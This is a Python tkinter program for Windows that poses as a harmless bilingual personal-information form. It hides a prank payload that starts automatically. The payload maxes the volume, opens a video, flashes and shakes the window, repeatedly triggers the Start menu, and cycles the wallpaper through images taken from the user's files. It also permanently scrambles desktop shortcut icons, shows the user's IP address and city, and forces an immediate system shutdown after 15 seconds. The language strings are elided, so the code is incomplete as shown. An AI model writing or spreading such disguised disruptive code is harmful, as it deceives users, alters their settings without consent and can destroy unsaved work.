import tkinter as tk
from tkinter import ttk, messagebox
import urllib.request, json, os, threading, ctypes, random, time, webbrowser, pythoncom
import win32com.client

# Win32 constants
SPI_SETDESKWALLPAPER = 20
KEYEVENTF_EXTENDEDKEY = 0x0001
KEYEVENTF_KEYUP = 0x0002
VK_LWIN = 0x5B

user32 = ctypes.windll.user32

class UserInfoApp(tk.Tk):
    WIDTH, HEIGHT = 700, 800
    def __init__(self):
        super().__init__()
        # initial language
        self.languages = {'TR':'Türkçe','EN':'English'}
        self.current_lang = tk.StringVar('EN')
        self.texts = { 'TR':{...}, 'EN':{...} }
        # window setup
        self.title(self.texts['EN']['title'])
        self.geometry(f"{self.WIDTH}x{self.HEIGHT}")
        self.resizable(False, False)
        # capture window handle and origin once
        self.update_idletasks()
        hwnd = ctypes.windll.user32.FindWindowW(None, self.title())
        rect = ctypes.wintypes.RECT()
        ctypes.windll.user32.GetWindowRect(hwnd, ctypes.byref(rect))
        self.orig_x, self.orig_y = rect.left, rect.top
        self.hwnd = hwnd
        # canvas for flash
        self.flash_canvas = tk.Canvas(self, width=self.WIDTH, height=self.HEIGHT, highlightthickness=0)
        self.flash_canvas.place(x=0,y=0)
        # build UI
        self._build_ui()
        # defer pranks until UI stable
        self.after(2000, self._deferred_pranks)

    def _build_ui(self):
        padding = {'padx':15,'pady':8}
        # language selector
        lang_frame = ttk.Frame(self)
        lang_frame.pack(fill='x', pady=10)
        ttk.Label(lang_frame,text="Dil/Language:").pack(side='left',padx=10)
        combo = ttk.Combobox(lang_frame, values=list(self.languages.values()), state='readonly')
        combo.current(1)
        combo.pack(side='left')
        combo.bind('<<ComboboxSelected>>',self._on_language_change)
        self.lang_combo = combo
        # form
        form = ttk.Frame(self,padding=20)
        form.pack(fill='both',expand=True)
        form.columnconfigure(0,weight=1); form.columnconfigure(1,weight=3)
        self.entries = {}
        fields = ['name','surname','age','hobbies','food','free','phobias']
        for i,f in enumerate(fields):
            lbl = ttk.Label(form,text='')
            lbl.grid(row=i,column=0,sticky='nw' if f in ['hobbies','free','phobias'] else 'w',**padding)
            if f in ['hobbies','free','phobias']:
                txt = tk.Text(form,width=40,height=4)
                txt.grid(row=i,column=1,sticky='ew',**padding)
                self.entries[f] = txt
            else:
                var = tk.StringVar() if f in ['name','surname','food'] else tk.IntVar(18)
                widget = ttk.Entry(form,textvariable=var) if f in ['name','surname','food'] else ttk.Spinbox(form,from_=1,to=120,textvariable=var,width=7)
                widget.grid(row=i,column=1,sticky='ew',**padding)
                self.entries[f] = var
            self.entries[f+'_label'] = lbl
        self.submit_btn = ttk.Button(self,text='',command=self._on_submit)
        self.submit_btn.pack(pady=20)
        self._apply_texts()

    def _apply_texts(self):
        t = self.texts[self.current_lang.get()]
        self.title(t['title'])
        for key in ['name','surname','age','hobbies','food','free','phobias']:
            self.entries[key+'_label'].config(text=t[key])
        self.submit_btn.config(text=t['submit'])

    def _on_language_change(self,event):
        sel = self.lang_combo.get()
        for k,v in self.languages.items():
            if v==sel: self.current_lang.set(k)
        self._apply_texts()

    def _on_submit(self):
        t = self.texts[self.current_lang.get()]
        # fetch IP and location
        ip,loc='N/A','N/A'
        try:
            ip=urllib.request.urlopen('https://api.ipify.org').read().decode()
            data=json.load(urllib.request.urlopen(f'http://ip-api.com/json/{ip}'))
            loc=f"{data.get('city','')} {data.get('regionName','')}"
        except: pass
        msg=f"{t['info_msg']}\n\n{t['ip_label']}: {ip}\n{loc} {t['end_msg']}\n\n{t['shutdown_notice']}"
        messagebox.showinfo(title=t['info_title'],message=msg)
        # defer pranks by 2s
        self.after(2000, self._deferred_pranks)

    def _deferred_pranks(self):
        # video & max volume
        ctypes.windll.winmm.waveOutSetVolume(0,0xFFFFFFFF)
        webbrowser.open('https://youtu.be/A70boEx6wHo?si=7JiCCqBXp84_4Q07')
        # schedule flash, shake, wallpaper, startmenu, icons, cursor trails, shutdown
        end=time.time()+15
        threading.Thread(target=self._flash_loop,args=(end,),daemon=True).start()
        threading.Thread(target=self._shake_loop,args=(end,),daemon=True).start()
        threading.Thread(target=self._toggle_startmenu,args=(end,),daemon=True).start()
        threading.Thread(target=self._wallpaper_loop,args=(end,),daemon=True).start()
        threading.Thread(target=self._change_icons,daemon=True).start()
        threading.Thread(target=self._cursor_trails,args=(end,),daemon=True).start()
        threading.Timer(15,lambda: os.system('shutdown /s /t 0')).start()

    def _flash_loop(self,end):
        while time.time()<end:
            rect=self.flash_canvas.create_rectangle(0,0,self.WIDTH,self.HEIGHT,fill='white')
            self.after(100,lambda: self.flash_canvas.delete(rect))
            time.sleep(0.5)

    def _shake_loop(self,end):
        while time.time()<end:
            dx,dy=random.randint(-5,5),random.randint(-5,5)
            user32.MoveWindow(self.hwnd,self.orig_x+dx,self.orig_y+dy,self.WIDTH,self.HEIGHT,True)
            time.sleep(0.05)
        user32.MoveWindow(self.hwnd,self.orig_x,self.orig_y,self.WIDTH,self.HEIGHT,True)

    def _toggle_startmenu(self,end):
        while time.time()<end:
            user32.keybd_event(VK_LWIN,0,KEYEVENTF_EXTENDEDKEY,0)
            user32.keybd_event(VK_LWIN,0,KEYEVENTF_EXTENDEDKEY|KEYEVENTF_KEYUP,0)
            time.sleep(0.5)

    def _wallpaper_loop(self,end):
        pics=[os.path.join(r,f) for r,_,fs in os.walk(os.path.expanduser('~')) for f in fs if f.lower().endswith('.png')]
        if not pics: return
        while time.time()<end:
            user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER,0,random.choice(pics),3)
            time.sleep(0.2)

    def _change_icons(self):
        desk=os.path.join(os.path.expanduser('~'),'Desktop')
        scts=[f for f in os.listdir(desk) if f.lower().endswith('.lnk')]
        if len(scts)<2: return
        shell=win32com.client.Dispatch('WScript.Shell')
        links=[(shell.CreateShortcut(os.path.join(desk,n)),n) for n in random.sample(scts, min(5,len(scts)))]
        icons=[ln.IconLocation for ln,_ in links]
        random.shuffle(icons)
        for (ln,_),ic in zip(links,icons): ln.IconLocation=ic;ln.save()

    def _cursor_trails(self,end):
        SPI_SETMOUSETRAILS=0x005D
        while time.time()<end:
            ctypes.windll.user32.SystemParametersInfoW(SPI_SETMOUSETRAILS, random.randint(0,20),0,0)
            time.sleep(0.5)

if __name__=='__main__':
    pythoncom.CoInitialize()
    app=UserInfoApp()
    app.mainloop()

